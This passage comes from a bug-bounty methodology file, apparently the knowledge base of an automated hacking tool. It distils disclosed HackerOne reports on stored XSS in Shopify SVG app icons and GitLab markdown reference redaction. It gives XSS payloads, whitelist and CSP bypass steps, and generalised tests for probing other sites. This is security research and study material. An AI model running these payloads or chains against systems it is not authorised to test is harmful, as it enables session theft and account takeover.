  2. Upload an SVG containing an XML DTD entity declaration and reference the entity in the body; the entity makes the whitelist stop being enforced, so an event handler on the root element is accepted:
     `<?xml version="1.0" encoding="ISO-8859-1"?>` / `<!DOCTYPE svg [ <!ENTITY elem ""> ]>` / `<svg onload="alert(document.domain);" height="16" width="16">&elem;</svg>`
     reporter's words, verbatim: "when the SVG contains an XML entity this whitelist is no longer enforced allowing the developer to include malicious attributes such as `onload`".
  3. The icon renders on `partners.shopify.com` (partner/developer dashboard) → it fires immediately on load.
  4. Reach a MERCHANT's admin through the ordinary OAuth app-install screen on the shop: `/admin/oauth/authorize?client_id=<app>&scope=read_products&redirect_uri=https://attacker/<nonce>.html&state=<nonce>`; once the shop admin authorizes, the icon is rendered inside `/admin` on the shop's own myshopify origin → the payload fires as the merchant admin on every admin load, with no further interaction. The app needs NO special scopes, so authorization is easy to obtain.
  5. Before reporting, enumerate EVERY surface the stored asset is rendered on (the report explicitly flags app-store/internal-admin as unexplored) — one stored value with several sinks is ONE report, not several.
DETECTION SIGNAL: an SVG/XML upload that advertises a whitelist of elements and attributes; a validator disturbed by a DOCUMENT-LEVEL construct (DTD/`<!ENTITY>`, XML prolog, namespace prefix, processing instruction) — try the entity first; one stored asset rendered on more than one origin (partner/dev dashboard AND a customer or admin UI); any app-install/OAuth flow that renders developer-controlled branding inside the victim's privileged session.
CHAIN: one account able to create/upload an app icon -> `<!DOCTYPE svg [<!ENTITY x "">]>` + `onload` on `<svg>` -> the whitelist no longer enforced -> handler stored -> rendered on `partners.shopify.com` and, after an ordinary OAuth authorization, inside `https://$shop$.myshopify.com/admin/` -> script runs as the merchant admin on every admin load -> admin session/session-token theft and privileged store actions (Stored XSS; $5,000.00, disclosed 2017-06-27).
TRANSFERABLE TEST: upload `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "">]><svg onload="alert(1)" height="16" width="16">&x;</svg>` (and variants with the entity inside an attribute value and inside element content) to every SVG/XML upload that claims to whitelist elements/attributes; fetch the STORED asset and byte-diff it against what you sent — a surviving `onload` means the whitelist is bypassed; then trace every origin that renders that asset and, for a privileged one, drive the install/OAuth flow from a second account to prove admin-context execution.

NOTE — §17 addition 2026-11-07 batch 22 (§17.96 from 1 readable source; the other 5 sources of the batch appended nothing — their report bodies are `no-content`, i.e. never published, and every reader route was exhausted; nothing invented). WHY IT IS A NEW GENERAL METHOD: §1.4 already records SVG-upload XSS (#1504202 TikTok Ads — an SVG served as a document, `<script>` executes on direct navigation) and §1.5 records filter-SHAPE bypasses (#44217 greedy `<...>` regex); neither involves a DOCUMENT-LEVEL construct that turns a whitelist validator off, and neither lands in a privileged admin origin through an app-install/OAuth flow. The transferable idea: whitelist validators that PARSE the document are defeated by anything that changes HOW it is parsed (a DTD/entity declaration, an XML prolog, a namespace prefix), and the value of the bypass is highest when the stored asset is rendered inside an admin/partner console. Full per-source route/honesty records are in `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-07.md`.

### [Bugbountyskills.md] 17.97 A markdown REFERENCE-REDACTION pass reads a stored html-encoded attribute back out and re-emits it as raw HTML (entity-ENCODE in, DECODE out) -> stored XSS; `script-src 'self'` then defeated by an attacker-stored `.js` served as `application/javascript` through git-lfs (GitLab #836649)

SOURCE: https://hackerone.com/reports/836649 — GitLab, "Stored XSS in markdown when redacting references" (Cross-site Scripting (XSS) - Stored; High 7~8.9; $5,000; reporter vakzz; asset `gitlab.com`; disclosed 2020-09-09)  read 2026-11-07 (route: full researcher body, 4,560 B, `visibility: full`, from the local disclosed-reports dataset mirror `/tmp/h1_train.parquet`; the live page also renders PARTIALLY via `web_extract` including the reporter's follow-up comments with the git-lfs CSP bypass; browser tool and `r.jina.ai` are Cloudflare-gated from this egress)
CLASS: stored XSS via a sanitize-on-render / decode-on-redact mismatch in a link-reference filter (CWE-79 / CWE-116)
CORE METHOD:
  1. Entry point = a markdown surface whose autolink/reference filter has a REDACTION path. Create your own PRIVATE project + issue, then from a SECOND account that CANNOT read that project post a comment (on any public issue) linking to it — the reference is unreadable for the reader, so the redaction replace pass runs.
  2. Payload = the raw-HTML anchor markdown lets through, with the dangerous markup ENTITY-ENCODED so the sanitizer sees text:
     `link: <a href="https://gitlab.com/<you>/private-project/-/issues/1" title="title">xss &lt;img onerror=alert(1) src=x></a>`
  3. The redactor stores the html-encoded content in `data-original` and rebuilds output by interpolation with NO re-escape — report code: `redacted_node_content` -> `original_content = node.attr('data-original')` -> `%(<a href="#{href}">#{content}</a>)` (GitLab 12.9.2-ee). Encoded on the way in, decoded on the way out: the rendered page carries a LIVE `<img onerror="alert(1)" src="x">`.
  4. CSP blocks the inline handler, so arm the injected markup with the app's OWN JS-framework attributes and make the anchor full-viewport (click-anywhere):
     `&lt;a data-remote=&quot;true&quot; data-method=&quot;get&quot; data-type=&quot;script&quot; href=/<you>/<proj>/wiki/raw/master/test.js class='atwho-view select2-drop-mask pika-select'>&lt;img height=10000 width=10000>&lt;/a>`
     = a rails-ujs remote-script anchor: one click anywhere loads the href AS A SCRIPT.
  5. `script-src 'self'` defeat (reporter's comment, verified with `curl -I`): a `.js` committed through **git-lfs** is served from the app's own origin as JavaScript — `$ curl -I 'https://gitlab.com/<you>/<proj>/-/raw/master/test.js'` -> `HTTP/2 200` / `content-type: application/javascript` — so ATTACKER code loads under a `'self'`-only policy; a later comment notes issue #3 has a variant needing no interaction at all.
  6. Impact per the report: "Anywhere the `ReferenceRedactor` is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss."
DETECTION SIGNAL: a filter PAIR where the first render escapes but a later REDACT/RE-RENDER/REPLACE pass reads a STORED raw value back out (`data-original`, `data-raw`, `data-text`, a serialized `title`, tooltip/copy buffers) — above all when that pass runs only for a viewer who LACKS permission on the linked object (two accounts needed to prove it); the "redacting references / restricted / confidential" renderer itself; framework helpers that turn a generic ATTRIBUTE into a script or request load (rails-ujs `data-type="script"`/`data-remote`, htmx, Alpine `@`, `ng-`); a `script-src 'self'`/`'strict-dynamic'` policy on an app that stores user files (git-lfs, wikis, attachments, raw endpoints, asset hosts) — fetch a user-uploaded `.js` and read its `Content-Type`.
CHAIN: low-priv account -> comment containing a raw `<a>` that links to a private/unauthorized object and carries ENTITY-ENCODED markup -> the redaction pass decodes `data-original` and re-emits HTML -> live markup + a `data-type="script"` remote anchor stored in the comment -> `script-src 'self'` defeated by a same-origin `.js` stored via git-lfs and served as `application/javascript` -> JS in every victim's authenticated session on every markdown surface -> API-token/session theft -> account takeover (Stored XSS; High 7~8.9; $5,000).
TRANSFERABLE TEST: post a markdown comment that (a) LINKS to a private/unauthorized object you own and (b) wraps the markup in a raw `<a>` with the payload ENTITY-ENCODED (`&lt;img onerror=alert(1) src=x>`); re-read the rendered HTML as the OTHER account — a live `<img onerror>` proves decode-on-redact. If CSP blocks inline JS, store a `.js` in the app's own user-file storage (git-lfs/attachment/wiki raw), `curl -I` it to confirm `content-type: application/javascript`, and reference it with the framework's script-loading attributes (`data-type="script" data-remote="true"`).
RELATED-BUT-DISTINCT: the `ReferenceRedactor`/`data-original` re-emit SINK is already recorded in §17 (the design-filename attribute-injection entry, `filename*=` quote-breakout). NEW here: the TRIGGER is a cross-permission link to a private object (the pass only runs for a reader without permission), the entity-encode-in/DECODE-out property as the sanitizer bypass, and the git-lfs `application/javascript` Content-Type as the `script-src 'self'` defeat. #662287 is cited by the report as the same-family click-anywhere CSP trick and is not itself recorded here.
WHY IT IS A NEW GENERAL METHOD: sanitizer audits usually compare ONE render path against one payload. This bug lives in the SECOND render of the same value (the redaction pass) under a DIFFERENT permission context, where the escaping contract is inverted. The transferable habit: for every stored value that is re-rendered later (redaction, revision diff, export, notification, API echo), test entity-encoded input and confirm what the app re-decodes; and when `script-src 'self'` is the only defence, look for a user-writable same-origin file whose Content-Type is script.

